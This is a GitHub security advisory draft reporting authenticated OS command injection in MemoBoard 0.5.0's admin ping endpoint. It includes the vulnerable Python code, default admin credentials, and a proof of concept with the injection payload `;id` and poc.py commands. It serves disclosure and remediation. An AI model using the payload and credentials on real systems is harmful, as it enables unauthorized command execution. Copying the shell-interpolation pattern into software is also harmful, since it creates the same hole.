# GitHub Security Advisory

Write all fill-in content in English (GitHub Advisory form). Do not use Chinese in Title, Description, or Severity notes. Copy from `### Summary` through Impact into the Description field. Leave Patched versions empty if there is no upstream fix.

Do not render this file as HTML in the product UI; keep it as copy-paste Markdown source.

---

## Title

```
MemoBoard admin ping endpoint OS command injection
```

---

## Description

Copy from the next `### Summary` through the end of Impact.

### Summary

An administrator session can pass a crafted `host` query parameter to `GET /api/tools/ping` and execute arbitrary OS commands. The value is interpolated into a shell string and run with `subprocess.getoutput`, so metacharacters such as `;` are honored and command output is returned in the HTTP body.

### Details

MemoBoard 0.5.0 exposes `api_ping` in `src/app.py`. The route requires `session["name"]` and `session["role"] == "admin"`, then calls `ping_host(host)` in `src/board/engine.py`. That helper returns `subprocess.getoutput(f"echo MEMO-PING {host}")`. `getoutput` invokes the system shell, so the intended control (pass a host/IP as data, not as shell syntax) is skipped.

This finding is scored as authenticated admin RCE. Admin credentials exist in seed data (`admin` / `admin123`) and can also be recovered via the separate unauthenticated SQL injection on `GET /api/users`; that chain is not required for the sink itself. Suggested fix: run an argv list with `shell=False`, whitelist host syntax, and never concatenate into a shell string.

### Vulnerable code

- Path: `src/board/engine.py:77`

```python
def ping_host(host: str) -> str:
    # Host is interpolated into a shell command and the output is returned.
    return subprocess.getoutput(f"echo MEMO-PING {host}")
```

Entry point that forwards the unsanitized `host` parameter:

- Path: `src/app.py:97`

```python
@app.get("/api/tools/ping")
def api_ping():
    """Ops ping. Admin session required; host is still interpolated into a shell."""
    if not session.get("name"):
        abort(401)
    if session.get("role") != "admin":
        abort(403)
    host = request.args.get("host", "127.0.0.1")
    return Response(ping_host(host), mimetype="text/plain")
```

### PoC

Requires a running instance you are authorized to test. Do not include real secrets.

Login as admin, then inject a command. The session cookie is replaced with a placeholder.

```http
POST /api/login HTTP/1.1
Host: TARGET:5000
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin123"}
```

```http
GET /api/tools/ping?host=;id HTTP/1.1
Host: TARGET:5000
Cookie: session=<admin_session_cookie>
Connection: close
```

Expected body contains `MEMO-PING` plus the output of `id`. Reproducible CLI in the same directory (`-c` prints command output):

```text
python poc.py -u http://TARGET:5000 -c id
python poc.py -u http://TARGET:5000 -c id --proxy http://127.0.0.1:8080
```

Do not run this against systems you do not own or have authorization to test.

### Impact

CWE-78. A caller with an admin session can execute arbitrary operating-system commands on the MemoBoard host and read the output. Remaining control: non-admin sessions receive 401/403. Do not score this as unauthenticated RCE by itself; chaining through SQL injection or default seed credentials is a separate path to obtain the admin session.

---

## Affected products

| Field | Value |
| --- | --- |
| Ecosystem | `pip` |
| Package name | memoboard |
| Affected versions | 0.5.0 |
| Patched versions | |

---

## Severity / CWE

- **Severity:** High
- **CVSS 3.1:** 7.2 High — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
- **CVSS 4.0:** 8.6 High — `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`
- **CWE:** CWE-78 Improper Neutralization of Special Elements used in an OS Command ("OS Command Injection")
- **Related:**
